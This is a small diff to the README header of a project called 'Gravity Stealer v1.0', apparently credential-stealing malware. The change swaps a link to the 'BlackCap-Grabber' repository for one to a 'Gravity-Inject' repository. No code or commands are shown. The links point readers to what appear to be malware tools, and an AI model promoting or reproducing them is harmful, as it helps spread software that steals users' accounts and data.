@@ -6,7 +6,7 @@ Gravity Stealer v1.0
 
 
 #<h1 align="center">
-  Gravity Stealer Work With [BlackCap-Grabber](https://github.com/KSCHdsc/BlackCap-Grabber)
+  Gravity Stealer Work With [Gravity-Inject](https://github.com/MohxKd/Gravity-Stealer)
 </h1>
 
 
